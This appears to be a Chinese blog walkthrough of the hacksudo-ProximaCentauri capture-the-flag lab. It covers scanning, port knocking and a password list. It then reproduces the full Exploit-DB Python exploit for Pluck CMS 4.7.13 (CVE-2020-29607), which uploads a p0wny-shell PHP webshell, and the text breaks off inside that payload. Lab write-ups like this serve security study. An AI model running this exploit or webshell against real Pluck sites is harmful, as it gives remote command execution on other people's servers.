    <content><![CDATA[<h1 id="hacksudo-ProximaCentauri"><a href="#hacksudo-ProximaCentauri" class="headerlink" title="hacksudo-ProximaCentauri"></a>hacksudo-ProximaCentauri</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hacksudo-ProximaCentauri</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/Desktop# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:3b:17:d5, IPv4: 192.168.43.92</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    42:bc:b8:53:66:d8       (Unknown: locally administered)</span><br><span class="line">192.168.43.187  08:00:27:07:eb:9a       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.213  08:00:27:e4:29:e6       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.045 seconds (125.18 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.710</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.170</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/Desktop# nmap -sV -A -p 1-65535 192.168.43.213</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 07:18 EDT</span><br><span class="line">Nmap scan report for 192.168.43.213</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-generator: pluck 4.7.13</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/data/ /docs/</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-title: HackSudo Proxima Centauri  - Image result for proxima centauri...</span><br><span class="line">|_Requested resource was http://192.168.43.213/?file=hacksudo-proxima-centauri</span><br><span class="line">MAC Address: 08:00:27:E4:29:E6 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.51 ms 192.168.43.213</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorre</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./hacksudo-ProximaCentauri/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.170/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(weiyi㉿weiyi)-[~]</span><br><span class="line">└─$ gobuster dir -u http://192.168.1.170/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.170/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/04 04:57:11 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 315] [--&gt; http://192.168.1.170/images/]</span><br><span class="line">/index.php            (Status: 302) [Size: 0] [--&gt; http://192.168.1.170/?file=hacksudo-proxima-centauri]</span><br><span class="line">/login.php            (Status: 200) [Size: 1245]                                                        </span><br><span class="line">/docs                 (Status: 301) [Size: 313] [--&gt; http://192.168.1.170/docs/]                        </span><br><span class="line">/files                (Status: 301) [Size: 314] [--&gt; http://192.168.1.170/files/]                       </span><br><span class="line">/data                 (Status: 301) [Size: 313] [--&gt; http://192.168.1.170/data/]                        </span><br><span class="line">/admin.php            (Status: 200) [Size: 4584]                                                        </span><br><span class="line">/install.php          (Status: 200) [Size: 4593]                                                        </span><br><span class="line">/robots.txt           (Status: 200) [Size: 47]                                                          </span><br><span class="line">/planet.html          (Status: 200) [Size: 1632]                                                        </span><br><span class="line">/planet               (Status: 301) [Size: 315] [--&gt; http://192.168.1.170/planet/]                      </span><br><span class="line">/requirements.php     (Status: 200) [Size: 4605]                                                        </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                                         </span><br><span class="line">/flag1.txt            (Status: 200) [Size: 64]                                                          </span><br><span class="line">                                                                                                        </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/04 04:58:44 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./hacksudo-ProximaCentauri/2.png" alt></p>
<ul>
<li><a href="http://192.168.1.170/planet/travel/" target="_blank" rel="noopener">http://192.168.1.170/planet/travel/</a></li>
</ul>
<p><img data-src="./hacksudo-ProximaCentauri/3.png" alt></p>
<ul>
<li>右键查看源代码</li>
</ul>
<p><img data-src="./hacksudo-ProximaCentauri/4.png" alt></p>
<ul>
<li><code>google</code>搜索 <code>proxima centauri coordinates</code></li>
</ul>
<p><img data-src="./hacksudo-ProximaCentauri/5.png" alt></p>
<ul>
<li><code>ssh knock 14 29 43</code></li>
</ul>
<h3 id="KNOCK-SSH"><a href="#KNOCK-SSH" class="headerlink" title="KNOCK SSH"></a>KNOCK SSH</h3><ul>
<li>打开<code>ssh</code>端口</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">knock 192.168.1.170 14 29 43</span><br><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 -oN nmap.log 192.168.1.170</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-ProximaCentauri/6.png" alt></p>
<ul>
<li>发现密码本文件</li>
</ul>
<p><img data-src="./hacksudo-ProximaCentauri/7.png" alt></p>
<p><a href="https://github.com/hacksudo/fog-hacksudo/blob/main/blackhole.lst" target="_blank" rel="noopener">https://github.com/hacksudo/fog-hacksudo/blob/main/blackhole.lst</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  GNU nano 5.4                          pass                                    </span><br><span class="line">proxima</span><br><span class="line">alfa</span><br><span class="line">alfacentauri</span><br><span class="line">proximab</span><br><span class="line">exoplanet</span><br><span class="line">hackme</span><br><span class="line">hackplanet</span><br><span class="line">alfahack</span><br><span class="line">proximatravel</span><br><span class="line">hacktheplanet</span><br><span class="line">hacksudo</span><br><span class="line">hacksudoplanet</span><br><span class="line">vishalastro</span><br><span class="line">alfab</span><br><span class="line"><span class="meta">#</span><span class="bash">try <span class="keyword">for</span> proxima centauri , this is blackwhole effect</span></span><br></pre></td></tr></table></figure>

<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p><img data-src="./hacksudo-ProximaCentauri/8.png" alt></p>
<p><img data-src="./hacksudo-ProximaCentauri/9.png" alt></p>
<ul>
<li>密码为 <code>hacktheplanet</code></li>
</ul>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><a href="https://www.exploit-db.com/exploits/49909" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49909</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)</span></span><br><span class="line"><span class="comment"># Date: 25.05.2021</span></span><br><span class="line"><span class="comment"># Exploit Author: Ron Jost (Hacker5preme)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://github.com/pluck-cms/pluck</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/pluck-cms/pluck/releases/tag/4.7.13</span></span><br><span class="line"><span class="comment"># Version: 4.7.13</span></span><br><span class="line"><span class="comment"># Tested on Xubuntu 20.04</span></span><br><span class="line"><span class="comment"># CVE: CVE-2020-29607</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Description:</span></span><br><span class="line"><span class="string">A file upload restriction bypass vulnerability in Pluck CMS before 4.7.13 allows an admin</span></span><br><span class="line"><span class="string">privileged user to gain access in the host through the "manage files" functionality,</span></span><br><span class="line"><span class="string">which may result in remote code execution.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Import required modules:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">User Input:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">target_ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">target_port = sys.argv[<span class="number">2</span>]</span><br><span class="line">password = sys.argv[<span class="number">3</span>]</span><br><span class="line">pluckcmspath = sys.argv[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Get cookie</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">link = <span class="string">'http://'</span> + target_ip + <span class="string">':'</span> + target_port + pluckcmspath</span><br><span class="line">response = session.get(link)</span><br><span class="line">cookies_session = session.cookies.get_dict()</span><br><span class="line">cookie = json.dumps(cookies_session)</span><br><span class="line">cookie = cookie.replace(<span class="string">'"&#125;'</span>,<span class="string">''</span>)</span><br><span class="line">cookie = cookie.replace(<span class="string">'&#123;"'</span>, <span class="string">''</span>)</span><br><span class="line">cookie = cookie.replace(<span class="string">'"'</span>, <span class="string">''</span>)</span><br><span class="line">cookie = cookie.replace(<span class="string">" "</span>, <span class="string">''</span>)</span><br><span class="line">cookie = cookie.replace(<span class="string">":"</span>, <span class="string">'='</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Authentication:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># Compute Content-Length:</span></span><br><span class="line">base_content_len = <span class="number">27</span></span><br><span class="line">password_encoded = urllib.parse.quote(password, safe=<span class="string">''</span>)</span><br><span class="line">password_encoded_len = len(password_encoded.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">content_len = base_content_len + password_encoded_len</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct Header:</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'Host'</span>: target_ip,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'de,en-US;q=0.7,en;q=0.3'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: str(content_len),</span><br><span class="line">    <span class="string">'Origin'</span>: <span class="string">'http://'</span> + target_ip,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://'</span> + target_ip + pluckcmspath + <span class="string">'/login.php'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct Data:</span></span><br><span class="line">body = &#123;</span><br><span class="line">    <span class="string">'cont1'</span>: password,</span><br><span class="line">    <span class="string">'bogus'</span>: <span class="string">''</span>,</span><br><span class="line">    <span class="string">'submit'</span>: <span class="string">'Log in'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authenticating:</span></span><br><span class="line">link_auth = <span class="string">'http://'</span> + target_ip + <span class="string">':'</span> + target_port + pluckcmspath + <span class="string">'/login.php'</span></span><br><span class="line">auth = requests.post(link_auth, headers=header, data=body)</span><br><span class="line">print(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'error'</span> <span class="keyword">in</span> auth.text:</span><br><span class="line">    print(<span class="string">'Password incorrect, please try again:'</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'Authentification was succesfull, uploading webshell'</span>)</span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Upload Webshell:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># Construct Header:</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'Host'</span>: target_ip,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'de,en-US;q=0.7,en;q=0.3'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=---------------------------5170699732428994785525662060'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://'</span> + target_ip + <span class="string">':'</span> + target_port + pluckcmspath + <span class="string">'/admin.php?action=files'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Constructing Webshell payload: I'm using p0wny-shell: https://github.com/flozz/p0wny-shell</span></span><br><span class="line">data = <span class="string">"-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"filefile\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) &#123;\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) &#123;\n        // pass\n    &#125; elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) &#123;\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    &#125; elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) &#123;\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    &#125; else &#123;\n        chdir($cwd);\n        exec($cmd, $stdout);\n    &#125;\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n&#125;\n\nfunction featurePwd() &#123;\n    return array(\"cwd\" =&gt; getcwd());\n&#125;\n\nfunction featureHint($fileName, $cwd, $type) &#123;\n    chdir($cwd);\n    if ($type == 'cmd') &#123;\n        $cmd = \"compgen -c $fileName\";\n    &#125; else &#123;\n        $cmd = \"compgen -f $fileName\";\n    &#125;\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n&#125;\n\nfunction featureDownload($filePath) &#123;\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) &#123;\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    &#125; else &#123;\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    &#125;\n&#125;\n\nfunction featureUpload($path, $file, $cwd) &#123;\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) &#123;\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    &#125; else &#123;\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    &#125;\n&#125;\n\nif (isset($_GET[\"feature\"])) &#123;\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) &#123;\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) &#123;\n                $cmd .= ' 2&gt;&amp;1';\n            &#125;\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    &#125;\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n&#125;\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body &#123;\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            &#125;\n\n            *::-webkit-scrollbar-track &#123;\n                border-radius: 8px;\n                background-color: #353535;\n            &#125;\n\n            *::-webkit-scrollbar &#123;\n                width: 8px;\n                height: 8px;\n            &#125;\n\n            *::-webkit-scrollbar-thumb &#123;\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            &#125;\n\n            #shell &#123;\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            &#125;\n\n            #shell-content &#123;\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            &#125;\n\n            #shell-logo &#123;\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            &#125;\n\n            @media (max-width: 991px) &#123;\n                #shell-logo &#123;\n                    font-size: 6px;\n                    margin: -25px 0;\n                &#125;\n\n                html, body, #shell &#123;\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                &#125;\n\n                #shell &#123;\n                    margin-top: 0;\n                &#125;\n            &#125;\n\n            @media (max-width: 767px) &#123;\n                #shell-input &#123;\n                    flex-direction: column;\n                &#125;\n            &#125;\n\n            @media (max-width: 320px) &#123;\n                #shell-logo &#123;\n                    font-size: 5px;\n                &#125;\n            &#125;\n\n            .shell-prompt &#123;\n                font-weight: bold;\n                color: #75DF0B;\n            &#125;\n\n            .shell-prompt &gt; span &#123;\n                color: #1BC9E7;\n            &#125;\n\n            #shell-input &#123;\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            &#125;\n\n            #shell-input &gt; label &#123;\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            &#125;\n\n            #shell-input #shell-cmd &#123;\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            &#125;\n\n            #shell-input div &#123;\n                flex-grow: 1;\n                align-items: stretch;\n            &#125;\n\n            #shell-input input &#123;\n                outline: none;\n            &#125;\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) &#123;\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            &#125;\n\n            function _insertStdout(stdout) &#123;\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            &#125;\n\n            function _defer(callback) &#123;\n                setTimeout(callback, 0);\n            &#125;\n\n            function featureShell(command) &#123;\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) &#123;\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                &#125; else if (/^\\s*clear\\s*$/.test(command)) &#123;\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                &#125; else &#123;\n                    makeRequest(\"?feature=shell\", &#123;cmd: command, cwd: CWD&#125;, function (response) &#123;\n                        if (response.hasOwnProperty('file')) &#123;\n                            featureDownload(response.name, response.file)\n                        &#125; else &#123;\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        &#125;\n                    &#125;);\n                &#125;\n            &#125;\n\n            function featureHint() &#123;\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) &#123;\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) &#123;\n                        if (type === 'cmd') &#123;\n                            eShellCmdInput.value = data.files[0];\n                        &#125; else &#123;\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        &#125;\n                    &#125; else &#123;\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    &#125;\n                &#125;\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    &#123;\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    &#125;,\n                    _requestCallback\n                );\n\n            &#125;\n\n            function featureDownload(name, file) &#123;\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            &#125;\n\n            function featureUpload(path) &#123;\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () &#123;\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) &#123;\n                        makeRequest('?feature=upload', &#123;path: path, file: file, cwd: CWD&#125;, function (response) &#123;\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        &#125;);\n                    &#125;, function () &#123;\n                        _insertStdout('An unknown client-side error occurred.');\n                    &#125;);\n                &#125;);\n                element.click();\n                document.body.removeChild(element);\n            &#125;\n\n            function getBase64(file, onLoadCallback) &#123;\n                return new Promise(function(resolve, reject) &#123;\n                    var reader = new FileReader();\n                    reader.onload = function() &#123; resolve(reader.result.match(/base64,(.*)$/)[1]); &#125;;\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                &#125;);\n            &#125;\n\n            function genPrompt(cwd) &#123;\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) &#123;\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                &#125;\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            &#125;\n\n            function updateCwd(cwd) &#123;\n                if (cwd) &#123;\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                &#125;\n                makeRequest(\"?feature=pwd\", &#123;&#125;, function(response) &#123;\n                    CWD = response.cwd;\n                    _updatePrompt();\n                &#125;);\n\n            &#125;\n\n            function escapeHtml(string) &#123;\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            &#125;\n\n            function _updatePrompt() &#123;\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            &#125;\n\n            function _onShellCmdKeyDown(event) &#123;\n                switch (event.key) &#123;\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) &#123;\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() &#123;\n                                eShellCmdInput.focus();\n                            &#125;);\n                        &#125;\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) &#123;\n                            break;\n                        &#125;\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) &#123;\n                            eShellCmdInput.value = \"\";\n                        &#125; else &#123;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        &#125;\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                &#125;\n            &#125;\n\n            function insertToHistory(cmd) &#123;\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            &#125;\n\n            function makeRequest(url, params, callback) &#123;\n                function getQueryString() &#123;\n                    var a = [];\n                    for (var key in params) &#123;\n                        if (params.hasOwnProperty(key)) &#123;\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        &#125;\n                    &#125;\n                    return a.join(\"&amp;\");\n                &#125;\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() &#123;\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;\n                        try &#123;\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        &#125; catch (error) &#123;\n                            alert(\"Error while parsing response: \" + error);\n                        &#125;\n                    &#125;\n                &#125;;\n                xhr.send(getQueryString());\n            &#125;\n\n            document.onclick = function(event) &#123;\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") &#123;\n                    return;\n                &#125;\n\n                if (!selection.toString()) &#123;\n                    eShellCmdInput.focus();\n                &#125;\n            &#125;;\n\n            window.onload = function() &#123;\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                